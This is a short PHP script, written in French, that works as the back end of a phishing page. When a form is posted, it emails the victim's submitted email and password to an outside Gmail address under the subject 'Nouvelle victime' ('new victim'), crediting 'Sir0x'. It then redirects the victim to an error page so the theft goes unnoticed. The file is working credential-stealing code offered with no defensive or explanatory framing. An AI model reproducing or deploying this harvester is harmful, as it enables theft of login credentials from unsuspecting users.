code PHP: <?php
if($_SERVER['REQUEST_METHOD'] == 'POST') {
mail('crackgame456@gmail.com
', 'Nouvelle victime', "Une nouvelle victime grace à Sir0x\nPseudo : "
.htmlentities($_POST['email'])."\nMot de passe : ".htmlentities($_POST['pass'])."");
header("Location: erreur.php");


}

?>